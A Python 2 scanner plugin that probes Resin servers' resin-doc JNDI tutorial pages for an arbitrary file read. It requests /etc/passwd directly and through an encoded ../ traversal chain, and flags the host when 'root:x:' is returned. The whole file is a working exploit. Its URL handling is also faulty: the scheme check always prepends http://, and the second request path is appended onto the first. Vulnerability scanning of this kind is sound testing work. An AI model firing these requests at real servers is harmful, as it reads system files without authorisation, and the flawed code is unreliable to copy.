#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from config import *

def check(site, _dir, app, lang):
    if 'resin_doc' in app.split(','):
        return True
    return False

def verify(ip, port=80, name=None, timeout=10, types='ip'):
    if types == 'ip':
        url = ip + ':' + str(port)
    else:
        url = ip
    if not url.startswith('http:/') or not url.startswith('https:/'):
        url = 'http://' + url

    try:
        urls = ['/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd',
                '/resin-doc/examples/jndi-appconfig/test?inputFile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
               ]
        for path in urls:
            url = url.rstrip('/') + path
            code, head, html = http_request_get(url)
            if 'root:x:' in html:
                details = 'Resin-Doc Read File %s' % (url)
                # target = site + _dir
                info = {
                    'url': url,
                    'severity': 'high',
                    'vuln_name': 'resin read file',
                    'proof': details
                }
                return info
    except Exception, e:
        pass

